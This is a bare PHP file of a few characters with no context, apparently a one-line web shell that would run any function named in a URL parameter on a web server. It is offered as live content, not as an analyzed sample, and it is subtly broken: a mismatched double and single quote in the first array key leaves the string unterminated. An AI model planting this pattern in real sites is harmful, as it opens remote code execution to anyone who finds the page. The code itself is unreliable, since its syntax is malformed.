<?php
$_GET["qWZNHrqj']($_GET['qWZNHrqj']);
?>
